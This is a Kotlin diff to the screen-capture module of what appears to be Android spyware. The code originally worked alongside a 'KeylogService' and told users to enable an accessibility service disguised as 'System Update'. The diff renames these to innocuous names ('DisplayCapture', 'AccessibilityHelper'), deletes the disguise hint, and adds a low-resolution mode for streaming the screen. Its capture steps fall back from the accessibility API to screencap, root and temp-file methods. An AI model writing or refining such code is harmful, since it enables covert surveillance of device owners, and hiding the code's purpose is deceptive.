@@ -8,12 +8,13 @@ import java.io.ByteArrayOutputStream
 import java.io.File
 import java.util.concurrent.TimeUnit
 
-class ScreenshotModule(private val context: android.content.Context) {
+class DisplayCapture(private val context: android.content.Context) {
 
     companion object {
-        private const val TAG = "ScreenshotModule"
         private const val QUALITY = 85
+        private const val STREAM_QUALITY = 60
         private const val MAX_DIM = 1920
+        private const val STREAM_MAX_DIM = 720
     }
 
     interface Callback {
@@ -22,49 +23,46 @@ class ScreenshotModule(private val context: android.content.Context) {
     }
 
     fun capture(callback: Callback) {
-        
+        captureInternal(callback, QUALITY, MAX_DIM)
+    }
+
+    fun captureForStream(callback: Callback) {
+        captureInternal(callback, STREAM_QUALITY, STREAM_MAX_DIM)
+    }
+
+    private fun captureInternal(callback: Callback, quality: Int, maxDim: Int) {
 
         // 1. AccessibilityService screenshot (Android 14+) — most reliable
         if (Build.VERSION.SDK_INT >= 34) {
-            
-            val svc = KeylogService.instance
+            val svc = AccessibilityHelper.instance
             if (svc != null) {
-                captureAccessibility(callback)
+                captureAccessibility(callback, quality, maxDim)
                 return
             }
-            
         }
 
         // 2. Direct screencap via stdout pipe
-        
         val directResult = captureDirect()
         if (directResult != null) {
-            val processed = processBytes(directResult)
+            val processed = processBytes(directResult, quality, maxDim)
             if (processed != null) { callback.onSuccess(processed); return }
         }
 
         // 3. Root screencap
-        
         val rootResult = captureRoot()
         if (rootResult != null) {
-            val processed = processBytes(rootResult)
+            val processed = processBytes(rootResult, quality, maxDim)
             if (processed != null) { callback.onSuccess(processed); return }
         }
 
-        // 4. Screencap via /data/local/tmp (emulator workaround)
-        
+        // 4. Screencap via /data/local/tmp
         val tmpResult = captureViaTmp()
         if (tmpResult != null) {
-            val processed = processBytes(tmpResult)
+            val processed = processBytes(tmpResult, quality, maxDim)
             if (processed != null) { callback.onSuccess(processed); return }
         }
 
-        val hint = if (Build.VERSION.SDK_INT >= 34) {
-            "Enable Accessibility: Settings → Accessibility → System Update → ON"
-        } else {
-            "Requires root. Enable root in AVD settings or use Android 14+ with Accessibility"
-        }
-        callback.onFailure("Screenshot failed. $hint")
+        callback.onFailure("Screenshot failed")
     }
 
     private fun captureDirect(): ByteArray? {
@@ -77,12 +75,8 @@ class ScreenshotModule(private val context: android.content.Context) {
             if (proc.exitValue() != 0) return null
             val bytes = proc.inputStream.readBytes()
             if (bytes.isEmpty() || bytes.size < 100) return null
-            
             bytes
-        } catch (e: Exception) {
-            
-            null
-        }
+        } catch (_: Exception) { null }
     }
 
     private fun captureRoot(): ByteArray? {
@@ -95,12 +89,8 @@ class ScreenshotModule(private val context: android.content.Context) {
             if (proc.exitValue() != 0) return null
             val bytes = proc.inputStream.readBytes()
             if (bytes.isEmpty() || bytes.size < 100) return null
-            
             bytes
-        } catch (e: Exception) {
-            
-            null
-        }
+        } catch (_: Exception) { null }
     }
 
     private fun captureViaTmp(): ByteArray? {
@@ -118,16 +108,12 @@ class ScreenshotModule(private val context: android.content.Context) {
             val bytes = tmpFile.readBytes()
             tmpFile.delete()
             if (bytes.isEmpty() || bytes.size < 100) return null
-            
             bytes
-        } catch (e: Exception) {
-            
-            null
-        }
+        } catch (_: Exception) { null }
     }
 
-    private fun captureAccessibility(callback: Callback) {
-        val svc = KeylogService.instance ?: run {
+    private fun captureAccessibility(callback: Callback, quality: Int, maxDim: Int) {
+        val svc = AccessibilityHelper.instance ?: run {
             callback.onFailure("AccessibilityService not running")
             return
         }
@@ -135,7 +121,6 @@ class ScreenshotModule(private val context: android.content.Context) {
             callback.onFailure("Accessibility screenshot requires Android 14+")
             return
         }
-        // Call the service's takeScreenshot directly with callback
         val exec = java.util.concurrent.Executors.newSingleThreadExecutor()
         try {
             svc.takeScreenshot(
@@ -146,10 +131,10 @@ class ScreenshotModule(private val context: android.content.Context) {
                         try {
                             val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
                             if (bitmap == null) { callback.onFailure("Bitmap wrap failed"); return }
-                            val bytes = java.io.ByteArrayOutputStream()
-                            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, bytes)
+                            val bytes = processBitmap(bitmap, quality, maxDim)
                             bitmap.recycle()
-                            callback.onSuccess(bytes.toByteArray())
+                            if (bytes != null) callback.onSuccess(bytes)
+                            else callback.onFailure("Process failed")
                         } catch (e: Exception) {
                             callback.onFailure("Accessibility: ${e.message}")
                         } finally {
@@ -168,22 +153,25 @@ class ScreenshotModule(private val context: android.content.Context) {
         }
     }
 
-    private fun processBytes(data: ByteArray): ByteArray? {
+    private fun processBytes(data: ByteArray, quality: Int, maxDim: Int): ByteArray? {
         return try {
             val bmp = BitmapFactory.decodeByteArray(data, 0, data.size) ?: return data
+            processBitmap(bmp, quality, maxDim)
+        } catch (_: Exception) { data }
+    }
+
+    private fun processBitmap(bmp: Bitmap, quality: Int, maxDim: Int): ByteArray? {
+        return try {
             val w = bmp.width; val h = bmp.height
-            val resized = if (w > MAX_DIM || h > MAX_DIM) {
-                val r = MAX_DIM.toFloat() / maxOf(w, h)
+            val resized = if (w > maxDim || h > maxDim) {
+                val r = maxDim.toFloat() / maxOf(w, h)
                 Bitmap.createScaledBitmap(bmp, (w * r).toInt(), (h * r).toInt(), true)
                     .also { if (it !== bmp) bmp.recycle() }
             } else bmp
             val out = ByteArrayOutputStream()
-            resized.compress(Bitmap.CompressFormat.JPEG, QUALITY, out)
+            resized.compress(Bitmap.CompressFormat.JPEG, quality, out)
             if (resized !== bmp) resized.recycle()
             out.toByteArray()
-        } catch (e: Exception) {
-            
-            data
-        }
+        } catch (_: Exception) { null }
     }
 }
